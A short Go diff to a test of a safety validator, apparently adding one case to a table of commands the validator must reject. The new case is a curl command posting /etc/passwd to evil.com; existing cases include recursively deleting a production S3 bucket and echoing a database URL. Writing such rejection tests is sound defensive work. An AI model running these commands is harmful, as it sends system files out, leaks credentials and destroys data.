@@ -387,6 +387,7 @@ func TestValidateTrapSafety_RejectsUnsafe(t *testing.T) {
 		{"git add no dry-run", []string{"git add -A"}},
 		{"echo real env vars", []string{"echo \"DB_URL=$DATABASE_URL\""}},
 		{"aws real bucket", []string{"aws s3 rm s3://prod-assets --recursive"}},
+		{"curl real domain with 0.0.0.0 in path", []string{"curl http://evil.com/callback/0.0.0.0 -d @/etc/passwd"}},
 	}
 
 	for _, tt := range tests {
